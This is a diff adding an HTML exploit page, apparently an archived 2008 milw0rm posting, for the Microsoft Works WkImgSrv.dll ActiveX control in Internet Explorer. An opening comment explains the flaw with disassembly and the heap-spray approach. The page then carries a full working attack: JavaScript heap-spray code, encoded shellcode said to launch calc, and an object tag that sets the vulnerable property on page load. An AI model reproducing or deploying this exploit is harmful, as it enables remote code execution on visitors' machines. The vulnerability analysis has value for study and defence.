@@ -1,0 +1,122 @@
+<!--
+The problem is in wkimgsrv.dll module shipped with many MS Offiice
+Suite (tested on MS OF 2003,MS OF 2007)
+Actually,this is not the case of buffer overflow attack,just a exploit
+of insecure method WKsPictureInterface.
+Setting this point to any where in memory and IE will crash when
+wkiimgsrv's trying to access an invalid memory location.
+
+Let's get into detail :
+
+00D473BD              PUSH EBP                                 ;
+Begin of Set WksPictureInterface method
+00D473BE   	 MOV EBP,ESP
+00D473C0              SUB ESP,1C
+00D473C3  	MOV EAX,DWORD PTR SS:[EBP+C]   ;  Move paramater to EAX
+00D473C6  	PUSH ESI
+00D473C7 	TEST EAX,EAX                             ;  Checking whether
+EAX is NULL
+00D473C9 	JNZ SHORT wkimgsrv.00D473D5    ;  OK,if it is not null continue
+00D473CB  	MOV EAX,80004005	        ;	
+00D473D0  	JMP wkimgsrv.00D47456               ;No,it's is NULL,exit method
+00D473D5  ==>	MOV ESI,DWORD PTR SS:[EBP+8] ; Do some other stuffs, we don't care
+00D473D8  	LEA EDX,DWORD PTR SS:[EBP-1C] ;
+00D473DB  	PUSH EDX
+00D473DC 	PUSH EAX
+00D473DD 	MOV DWORD PTR DS:[ESI+2A0],EAX        ; =============
+00D473E3   ==>	MOV ECX,DWORD PTR DS:[EAX]              ; Here is the
+problem,the data stored by EAX is referenced and moved into ECX
+00D473E5 	CALL DWORD PTR DS:[ECX+30]               ;Next the address
+in some struct pointed by ECX is called
+
+Now if we're able to setup memory satisfied :
+Create a struct in memory where the first DWORD in the struct point to
+itself and the DWORD at offset 0x30 from struct address is point to
+our shellcode.
+We should be able to exploit this vulnerability.
+This seem to be nightmare because there is nothing to inject except an
+integer as paramater for the method.
+Fortunately we have prefered heapspray method
+Howerver we can't spray with nop (0x90 ) anymore(if this happens, all
+address will be 90909090 which is invalid address) ,
+The addresses and byte to spray must comply some restrictions
+- Byte to spray must be single byte length instruction (or somewhat
+that not change execution of the program or causing exception)
+- Combination of 4 byte must refer to valid memory address which will
+point to it self.
+
+I have chosen 0x0A to spay on IE 7, and 0x05 to spay on IE 6. In
+Internet Explorer 7 the number passes to method is 168430090 which is
+0x0A0A0A0A in
+hexa mode.Let's assume that we has fill 0x0A into memory at
+0x0A0A0A0A. EAX will hold value of 0x0A0A0A0A.
+Mov ECX,DWORD PTR DS:[EAX]  ;=> ECX= 0x0A0A0A0A
+CALL DWORD DTR DS:[ECX+30] ;=> CALL DWORD DTR:[0x0A0A0A3A] => CALL 0x0A0A0A0A
+Memory at 0x0A0A0A0A is filled with 0x0A ~ instruction is OR CL,BYTE
+PTR DS:[EDX]
+Fortunately this hadn't caused exception and not changed execution
+path of our shellcode
+
+Shellcode should be executed as expected(calc will be opened).
+-->
+
+<html>
+<head>
+<title>Microsoft Works 7 WkImgSrv.dll Exploit</title>
+
+Coded by lhoang8500
+lhoang8500[at]gmail[dot]com
+ BKIS Center - Vietnam
+
+<SCRIPT language="javascript">
+
+	var heapSprayToAddress = 0x0A0A0A0A;
+
+	var payLoadCode =
+unescape("%u9090%u9090%u9090%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");
+
+	var heapBlockSize = 0x400000;
+
+	var payLoadSize = payLoadCode.length * 2;
+
+	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+
+	var spraySlide = unescape("%u0A0A%u0A0A");
+	spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+
+	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
+
+	memory = new Array();
+
+	for (i=0;i<heapBlocks;i++)
+	{
+		memory[i] = spraySlide + payLoadCode;
+	}
+
+
+
+	function getSpraySlide(spraySlide, spraySlideSize)
+	{
+		while (spraySlide.length*2<spraySlideSize)
+		{
+			spraySlide += spraySlide;
+		}
+		spraySlide = spraySlide.substring(0,spraySlideSize/2);
+		return spraySlide;
+	}
+
+</script>
+  <script language="JavaScript">
+    function payload() {
+var num = 168430090;
+obj.WksPictureInterface = num;
+  }
+   </script>
+</head>
+ <body onload="JavaScript: return payload();">
+<object classid="clsid:00E1DB59-6EFD-4CE7-8C0A-2DA3BCAAD9C6" id="obj">
+</object>
+ </body>
+</html>
+
+# milw0rm.com [2008-05-02]
